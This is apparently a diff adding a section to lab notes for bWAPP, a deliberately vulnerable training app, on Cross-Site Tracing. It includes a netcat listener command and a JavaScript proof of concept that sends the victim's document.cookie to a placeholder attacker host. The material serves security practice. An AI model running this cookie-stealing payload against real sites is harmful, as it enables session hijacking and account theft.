@@ -174,6 +174,47 @@ bWAPP/insecure_direct_object_ref_2.php
 
 Use Burp to unhide hidden ticket price field, or use proxy to modify the POST param while in transit.
 
+# A5 - Cross-Site Tracing (XST) 
+
+Doesn't work on modern browsers as there are security enforcements.  Maybe use phantomJS?
+
+I modified the POC to use GET instead of TRACE.  Additional changes from original xst.js include making the onreadystatechange NOT inline (seems to play better with FF).
+
+1.  Start listener on attacking machine:  nc -l 8888
+
+2.  Modify xst.js to match your environment:
+
+
+```
+var xmlhttp;	
+// Code for IE7+, Firefox, Chrome, Opera, Safari
+if (window.XMLHttpRequest)
+{
+	xmlhttp=new XMLHttpRequest();
+}
+// Code for IE6, IE5	
+else
+{ 
+	xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+}	
+
+xmlhttp.onreadystatechange=foo;
+
+function foo()
+{	
+	if (xmlhttp.readyState==4 && xmlhttp.status==200)
+	{	
+		xmlResp=xmlhttp.responseText;
+		// document.getElementById("response").innerHTML=xmlResp
+		alert(xmlResp);
+		document.location="http://[attacker_ip]:8888/grab.cgi?"+document.cookie;
+	}
+}
+// xmlhttp.open("TRACE","/bWAPP/",true);
+xmlhttp.open("GET","/bWAPP/",true);
+// xmlhttp.withCredentials = true;
+xmlhttp.send();
+```
 
 # A6 - Sensitive Data Exposure 
 
